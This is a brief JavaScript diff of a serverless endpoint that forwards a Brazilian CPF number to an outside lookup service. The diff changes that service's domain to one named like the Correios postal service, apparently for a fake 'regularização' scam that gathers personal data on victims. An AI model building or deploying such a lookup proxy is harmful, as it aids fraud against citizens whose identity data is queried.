@@ -6,7 +6,7 @@ module.exports = async (req, res) => {
     return res.status(400).json({ error: 'CPF não informado' });
   }
   try {
-    const response = await fetch(`https://rfb-blog.site/cpfs/new-api.php?cpf=${cpf}`);
+    const response = await fetch(`https://rastreamento.correiosregularizacao.com/rastreamento.php?cpf=${cpf}`);
     const data = await response.json();
     res.status(200).json(data);
   } catch (error) {
